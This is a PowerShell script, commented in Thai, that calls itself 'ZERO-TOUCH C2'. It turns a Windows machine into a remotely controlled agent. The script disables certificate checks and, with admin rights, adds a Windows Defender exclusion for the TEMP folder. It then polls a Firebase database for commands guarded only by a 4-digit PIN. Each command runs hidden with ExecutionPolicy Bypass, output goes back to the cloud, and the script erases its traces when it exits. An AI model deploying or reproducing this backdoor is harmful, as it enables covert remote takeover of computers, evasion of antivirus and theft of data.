param (
    [string]$FirebaseUrl = "https://uat-api-agent-default-rtdb.firebaseio.com/",
    [int]$PollIntervalSec = 3
)

# บังคับการเข้ารหัส Console เป็น UTF-8
$OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# เปิดใช้งานโปรโตคอลความปลอดภัย TLS 1.2
try {
    [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192
} catch {}
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

# กำหนดข้อยกเว้น Windows Defender ในโฟลเดอร์ TEMP (หากรันในสิทธิ์ Administrator)
try {
    $currentUser = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    $isAdmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($isAdmin) {
        Write-Host "[PRE-CHECK] Configuring Windows Defender exclusion for TEMP folder..." -ForegroundColor DarkGray
        Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
    }
} catch {}

# ฟังก์ชัน Native .NET HTTP Client (Zero-Dependency 100% ไม่ต้องพึ่งพา curl.exe)
function Invoke-FirebaseHttp {
    param(
        [Parameter(Mandatory=$true)][string]$Uri,
        [string]$Method = "GET",
        [string]$Body = $null,
        [int]$TimeoutSec = 15
    )
    $request = [System.Net.HttpWebRequest]::Create($Uri)
    $request.Method = $Method
    $request.Timeout = $TimeoutSec * 1000
    $request.ReadWriteTimeout = $TimeoutSec * 1000
    $request.KeepAlive = $true

    if (-not [string]::IsNullOrEmpty($Body)) {
        $request.ContentType = "application/json; charset=utf-8"
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
        $request.ContentLength = $bytes.Length
        $reqStream = $request.GetRequestStream()
        $reqStream.Write($bytes, 0, $bytes.Length)
        $reqStream.Close()
    }

    try {
        $response = $request.GetResponse()
        $respStream = $response.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($respStream, [System.Text.Encoding]::UTF8)
        $result = $reader.ReadToEnd()
        $reader.Close()
        $response.Close()
        return $result
    } catch [System.Net.WebException] {
        if ($_.Response) {
            $respStream = $_.Response.GetResponseStream()
            $reader = New-Object System.IO.StreamReader($respStream, [System.Text.Encoding]::UTF8)
            $errResult = $reader.ReadToEnd()
            $reader.Close()
            $_.Response.Close()
            return $errResult
        }
        throw $_
    }
}

$utf8NoBom = New-Object System.Text.UTF8Encoding($false)

# ตรวจสอบว่า Firebase URL ลงท้ายด้วย /
if ($FirebaseUrl -notlike "*/") {
    $FirebaseUrl = $FirebaseUrl + "/"
}

# ฟังก์ชันสุ่ม PIN 4 หลักพร้อมตรวจสอบความซ้ำซ้อนกับ Firebase RTDB (Anti-Collision Guard)
function Get-UniqueSecretKey {
    param([string]$BaseUrl)
    for ($attempt = 0; $attempt -lt 15; $attempt++) {
        $candidate = (Get-Random -Minimum 1000 -Maximum 10000).ToString()
        try {
            $checkUrl = $BaseUrl + "jobs/$candidate.json?shallow=true"
            $existing = Invoke-FirebaseHttp -Uri $checkUrl -Method "GET" -TimeoutSec 5
            if ([string]::IsNullOrWhiteSpace($existing) -or $existing.Trim() -eq "null") {
                return $candidate
            }
        } catch {
            return $candidate
        }
    }
    return (Get-Random -Minimum 1000 -Maximum 10000).ToString()
}

$SecretKey = Get-UniqueSecretKey -BaseUrl $FirebaseUrl

# แสดงแบนเนอร์ข้อมูลระบบและรหัส Secret Key แบบ Professional
Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host "                    BB_JAVIS REMOTE (ZERO-TOUCH C2)                   " -ForegroundColor Yellow
Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host "  -> Remote Secret Key : " -NoNewline -ForegroundColor Gray
Write-Host "[ $SecretKey ]" -NoNewline -ForegroundColor Green
Write-Host " (ACTIVE)" -ForegroundColor Yellow
Write-Host "  -> Connection Status : " -NoNewline -ForegroundColor Gray
Write-Host "Real-Time SSE Connected (<100ms)" -ForegroundColor Green
Write-Host "  -> Engine Type       : " -NoNewline -ForegroundColor Gray
Write-Host "Native .NET (Zero-Dependency)" -ForegroundColor White
Write-Host "  -> One-Link URL      : " -NoNewline -ForegroundColor Gray
Write-Host "da.gd/bbjavis" -ForegroundColor Cyan
Write-Host "----------------------------------------------------------------------" -ForegroundColor DarkGray
Write-Host "   * Give the Remote Secret Key above to your controller" -ForegroundColor Yellow
Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host "  Ready for incoming commands. Press Ctrl+C to stop." -ForegroundColor Gray
Write-Host "======================================================================" -ForegroundColor DarkCyan

# ลงทะเบียน PIN บน Cloud Command Board ป้องกันผู้อื่นสุ่มชน
try {
    $claimUrl = $FirebaseUrl + "jobs/$SecretKey/claim.json"
    $claimBody = '{"claimed_at":"' + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + '","status":"active","engine":"realtime_sse"}'
    $null = Invoke-FirebaseHttp -Uri $claimUrl -Method "PUT" -Body $claimBody -TimeoutSec 10
} catch {}

# ระบบ Self-Destruct Clean Exit: ทำลายข้อมูล Session ทันทีเมื่อปิดโปรแกรมหรือกด Ctrl+C
$script:isExiting = $false
$cleanExitAction = {
    if ($script:isExiting) { return }
    $script:isExiting = $true
    Write-Host "`n[SELF-DESTRUCT] Terminating session and cleaning Cloud board..." -ForegroundColor Yellow
    try {
        $delUrl = $FirebaseUrl + "jobs/$SecretKey.json"
        $null = Invoke-FirebaseHttp -Uri $delUrl -Method "DELETE" -TimeoutSec 5
    } catch {}
    # เคลียร์ไฟล์ชั่วคราวใน TEMP (Zero-Footprint)
    Get-ChildItem -Path $env:TEMP -Filter "remote_script_*.ps1" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    Get-ChildItem -Path $env:TEMP -Filter "agent_*_temp.json" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    Write-Host "[SUCCESS] Cloud session deleted cleanly. Zero data residue." -ForegroundColor Green
}

try {
    [Console]::TreatControlCAsInput = $false
    $cancelHandler = [ConsoleCancelEventHandler]{
        param($s, $e)
        & $cleanExitAction
    }
    [Console]::add_CancelKeyPress($cancelHandler)
} catch {}

# ฟังก์ชันประมวลผลคำสั่งระยะไกล (รองรับ Live Streaming, Emergency Abort และ Hard Timeout)
function Execute-RemoteJob {
    param(
        [string]$JobId,
        [PSCustomObject]$JobDetails,
        [string]$BaseUrl,
        [string]$CurrentKey
    )

    Write-Host "`n[NEW JOB] Received incoming job ID: $JobId" -ForegroundColor Yellow

    # ตรวจสอบรหัส Secret Key เพื่อความปลอดภัยสูงสุด
    if ($JobDetails.secret_key -ne $CurrentKey) {
        Write-Host " -> Access Denied: Secret Key mismatch! (Skipping job)" -ForegroundColor Red
        $patchBody = @{
            status = "failed"
            exit_code = 403
            stderr = "Access Denied: Invalid Secret Key (403 Forbidden)"
            completed_at = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
        } | ConvertTo-Json -Compress
        $updateUrl = $BaseUrl + "jobs/$CurrentKey/$JobId.json"
        $null = Invoke-FirebaseHttp -Uri $updateUrl -Method "PATCH" -Body $patchBody -TimeoutSec 10
        return
    }

    $command = $JobDetails.script_content
    $timeoutSec = 600
    if ($JobDetails.timeout_sec -and [int]::TryParse($JobDetails.timeout_sec, [ref]$null)) {
        $timeoutSec = [Math]::Max(10, [int]$JobDetails.timeout_sec)
    }

    # ตรวจสอบคำสั่งที่มีความเสี่ยงสูง
    if ($command -match "(?i)drop\s+database" -or $command -match "(?i)truncate\s+table") {
        Write-Host " -> [SECURITY WARNING] High-risk command detected (DROP DATABASE / TRUNCATE TABLE)" -ForegroundColor Yellow
    }

    # ปรับสถานะเป็น Running
    Write-Host " -> Updating job status: Running (Timeout: ${timeoutSec}s)..." -ForegroundColor Yellow
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $runBody = '{"status":"running","last_heartbeat":"' + $timestamp + '","progress_phase":"Executing command...","abort":false}'
    $updateUrl = $BaseUrl + "jobs/$CurrentKey/$JobId.json"
    $null = Invoke-FirebaseHttp -Uri $updateUrl -Method "PATCH" -Body $runBody -TimeoutSec 10

    # สร้างไฟล์คำสั่งชั่วคราวในโฟลเดอร์ TEMP
    $tempScriptPath = Join-Path $env:TEMP ("remote_script_" + [Guid]::NewGuid().ToString().Substring(0, 8) + ".ps1")
    [System.IO.File]::WriteAllText($tempScriptPath, $command, $utf8NoBom)

    $stdoutCollector = [System.Collections.Generic.List[string]]::new()
    $stderrCollector = [System.Collections.Generic.List[string]]::new()
    $exitCode = 0
    $isAborted = $false
    $isTimedOut = $false

    try {
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = "powershell.exe"
        $processInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$tempScriptPath`""
        $processInfo.RedirectStandardOutput = $true
        $processInfo.RedirectStandardError = $true
        $processInfo.UseShellExecute = $false
        $processInfo.CreateNoWindow = $true

        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $processInfo

        $logQueue = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
        $stdoutAction = {
            if (-not [string]::IsNullOrEmpty($EventArgs.Data)) {
                $logQueue.Enqueue("OUT:" + $EventArgs.Data)
            }
        }
        $stderrAction = {
            if (-not [string]::IsNullOrEmpty($EventArgs.Data)) {
                $logQueue.Enqueue("ERR:" + $EventArgs.Data)
            }
        }

        $jobStdout = Register-ObjectEvent -InputObject $process -EventName OutputDataReceived -Action $stdoutAction
        $jobStderr = Register-ObjectEvent -InputObject $process -EventName ErrorDataReceived -Action $stderrAction

        $null = $process.Start()
        $process.BeginOutputReadLine()
        $process.BeginErrorReadLine()

        $startTime = [DateTime]::UtcNow
        $lastStreamingTime = [DateTime]::UtcNow
        $lastAbortCheckTime = [DateTime]::UtcNow
        $stdoutTotalLength = 0
        $stderrTotalLength = 0
        $maxCharLimit = 500000

        Write-Host " -> Executing command..." -ForegroundColor Gray

        while (-not $process.HasExited) {
            Start-Sleep -Milliseconds 200

            # ดึงข้อความจากคิวเข้า Collector
            $line = $null
            while ($logQueue.TryDequeue([ref]$line)) {
                if ($line.StartsWith("OUT:")) {
                    $data = $line.Substring(4)
                    if ($stdoutTotalLength -lt $maxCharLimit) {
                        $stdoutCollector.Add($data)
                        $stdoutTotalLength += $data.Length
                    }
                } elseif ($line.StartsWith("ERR:")) {
                    $data = $line.Substring(4)
                    if ($stderrTotalLength -lt $maxCharLimit) {
                        $stderrCollector.Add($data)
                        $stderrTotalLength += $data.Length
                    }
                }
            }

            $now = [DateTime]::UtcNow

            # ตรวจสอบสัญญาณฉุกเฉิน Abort จาก Cloud ทุก 1 วินาที
            if (($now - $lastAbortCheckTime).TotalSeconds -ge 1.0) {
                $lastAbortCheckTime = $now
                try {
                    $abortUrl = $BaseUrl + "jobs/$CurrentKey/$JobId/abort.json"
                    $abortVal = Invoke-FirebaseHttp -Uri $abortUrl -Method "GET" -TimeoutSec 3
                    if ($abortVal -and $abortVal.Trim().ToLower() -eq "true") {
                        Write-Host "`n -> [EMERGENCY ABORT] Abort signal received from controller!" -ForegroundColor Red
                        $isAborted = $true
                        try {
                            Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
                        } catch {}
                        break
                    }
                } catch {}
            }

            # ตรวจสอบ Hard Timeout
            if (($now - $startTime).TotalSeconds -ge $timeoutSec) {
                Write-Host "`n -> [TIMEOUT] Execution exceeded Hard Timeout (${timeoutSec}s)!" -ForegroundColor Red
                $isTimedOut = $true
                try {
                    Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
                } catch {}
                break
            }

            # สตรีมผลลัพธ์ย่อยและ Heartbeat กลับ Firebase ทุก 2 วินาที
            if (($now - $lastStreamingTime).TotalSeconds -ge 2.0) {
                $lastStreamingTime = $now
                $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                $patchData = @{
                    last_heartbeat = $timestamp
                    progress_phase = "Executing command..."
                    stdout = ($stdoutCollector -join "`r`n")
                    stderr = ($stderrCollector -join "`r`n")
                } | ConvertTo-Json -Compress

                $updateUrl = $BaseUrl + "jobs/$CurrentKey/$JobId.json"
                $null = Invoke-FirebaseHttp -Uri $updateUrl -Method "PATCH" -Body $patchData -TimeoutSec 5
            }
        }

        if (-not $process.HasExited) {
            $process.WaitForExit(3000)
        }
        $exitCode = if ($process.HasExited) { $process.ExitCode } else { 1 }

        # ดึงข้อความคงค้างทั้งหมดจากคิว
        $line = $null
        while ($logQueue.TryDequeue([ref]$line)) {
            if ($line.StartsWith("OUT:")) {
                $data = $line.Substring(4)
                if ($stdoutTotalLength -lt $maxCharLimit) {
                    $stdoutCollector.Add($data)
                    $stdoutTotalLength += $data.Length
                }
            } elseif ($line.StartsWith("ERR:")) {
                $data = $line.Substring(4)
                if ($stderrTotalLength -lt $maxCharLimit) {
                    $stderrCollector.Add($data)
                    $stderrTotalLength += $data.Length
                }
            }
        }
    }
    catch {
        $exitCode = 1
        $stderrCollector.Add("Execution exception: $_")
    }
    finally {
        if ($jobStdout) { try { Unregister-Event -SourceIdentifier $jobStdout.Name -ErrorAction SilentlyContinue } catch {} }
        if ($jobStderr) { try { Unregister-Event -SourceIdentifier $jobStderr.Name -ErrorAction SilentlyContinue } catch {} }
        if (Test-Path $tempScriptPath) { Remove-Item $tempScriptPath -Force -ErrorAction SilentlyContinue }
    }

    # ประเมินสถานะสุดท้าย
    $finalStatus = "completed"
    if ($isAborted) {
        $finalStatus = "cancelled"
        $exitCode = 130
        $stderrCollector.Add("[JOB CANCELLED] Emergency abort requested by controller.")
    } elseif ($isTimedOut) {
        $finalStatus = "failed"
        $exitCode = 124
        $stderrCollector.Add("[JOB TIMEOUT] Process terminated after exceeding ${timeoutSec} seconds.")
    } elseif ($exitCode -ne 0) {
        $finalStatus = "failed"
    }

    Write-Host " -> Job execution finished: $finalStatus (Exit Code: $exitCode)" -ForegroundColor Green

    $finalBody = @{
        status = $finalStatus
        exit_code = $exitCode
        stdout = ($stdoutCollector -join "`r`n")
        stderr = ($stderrCollector -join "`r`n")
        completed_at = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    } | ConvertTo-Json -Compress

    $updateUrl = $BaseUrl + "jobs/$CurrentKey/$JobId.json"
    $null = Invoke-FirebaseHttp -Uri $updateUrl -Method "PATCH" -Body $finalBody -TimeoutSec 15
}

Write-Host "`n------------------------------------------------------" -ForegroundColor Cyan
Write-Host "Status: Dual-Mode Event Engine Active. Listening for jobs..." -ForegroundColor Green
Write-Host "------------------------------------------------------" -ForegroundColor Cyan

$lastProcessedJob = ""

# Main Execution Loop: Dual-Mode (Real-Time SSE Push + Adaptive Polling Fallback)
try {
    while (-not $script:isExiting) {
        $sseActive = $false
        try {
            $streamUrl = $FirebaseUrl + "jobs/$SecretKey.json"
            $request = [System.Net.HttpWebRequest]::Create($streamUrl)
            $request.Accept = "text/event-stream"
            $request.Timeout = 180000
            $request.ReadWriteTimeout = 180000

            $response = $request.GetResponse()
            $stream = $response.GetResponseStream()
            $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
            $sseActive = $true

            $dataBuffer = [System.Text.StringBuilder]::new()

            while (-not $reader.EndOfStream -and -not $script:isExiting) {
                $line = $reader.ReadLine()
                if ($null -eq $line) { break }

                if ($line.StartsWith("data: ")) {
                    $null = $dataBuffer.AppendLine($line.Substring(6))
                } elseif ($line -eq "") {
                    if ($dataBuffer.Length -gt 0) {
                        $rawJson = $dataBuffer.ToString().Trim()
                        [void]$dataBuffer.Clear()

                        if ($rawJson -and $rawJson -ne "null") {
                            try {
                                $eventObj = ConvertFrom-Json -InputObject $rawJson -ErrorAction SilentlyContinue
                                if ($eventObj) {
                                    $payload = if ($eventObj.data) { $eventObj.data } else { $eventObj }
                                    
                                    # ค้นหา Job ที่สถานะ pending
                                    $targetJobId = $null
                                    $targetJobDetails = $null

                                    if ($payload -is [System.Management.Automation.PSCustomObject]) {
                                        # กรณีเป็น Job เดียวส่งมาตรงๆ
                                        if ($payload.status -eq "pending" -and $payload.script_content) {
                                            $path = if ($eventObj.path) { $eventObj.path.TrimStart('/') } else { "" }
                                            $targetJobId = if ($path) { $path } else { "job-" + [Guid]::NewGuid().ToString().Substring(0, 8) }
                                            $targetJobDetails = $payload
                                        } else {
                                            # กรณีเป็นชุด Object ของ Jobs
                                            foreach ($prop in $payload.PSObject.Properties) {
                                                if ($prop.Value -and $prop.Value.status -eq "pending") {
                                                    $targetJobId = $prop.Name
                                                    $targetJobDetails = $prop.Value
                                                    break
                                                }
                                            }
                                        }
                                    }

                                    if ($targetJobId -and $targetJobId -ne $lastProcessedJob) {
                                        $reader.Close()
                                        $response.Close()
                                        $sseActive = $false

                                        Execute-RemoteJob -JobId $targetJobId -JobDetails $targetJobDetails -BaseUrl $FirebaseUrl -CurrentKey $SecretKey
                                        $lastProcessedJob = $targetJobId
                                        break
                                    }
                                }
                            } catch {}
                        }
                    }
                }
            }

            if ($sseActive) {
                $reader.Close()
                $response.Close()
            }
        }
        catch {
            # หาก SSE หลุด หรือมีข้อจำกัดด้านเน็ตเวิร์ก ให้สลับมาใช้ Adaptive Fast Polling ชั่วคราว
            try {
                $queryUrl = $FirebaseUrl + "jobs/$SecretKey.json"
                $jsonRaw = Invoke-FirebaseHttp -Uri $queryUrl -Method "GET" -TimeoutSec 5
                if ($jsonRaw -and $jsonRaw.Trim() -ne "null" -and $jsonRaw.Trim().StartsWith("{")) {
                    $jobs = ConvertFrom-Json -InputObject $jsonRaw.Trim() -ErrorAction SilentlyContinue
                    if ($jobs -and $jobs -is [System.Management.Automation.PSCustomObject]) {
                        foreach ($prop in $jobs.PSObject.Properties) {
                            if ($prop.Value -and $prop.Value.status -eq "pending" -and $prop.Name -ne $lastProcessedJob) {
                                Execute-RemoteJob -JobId $prop.Name -JobDetails $prop.Value -BaseUrl $FirebaseUrl -CurrentKey $SecretKey
                                $lastProcessedJob = $prop.Name
                                break
                            }
                        }
                    }
                }
            } catch {}
            Start-Sleep -Seconds 1
        }
    }
}
finally {
    & $cleanExitAction
}
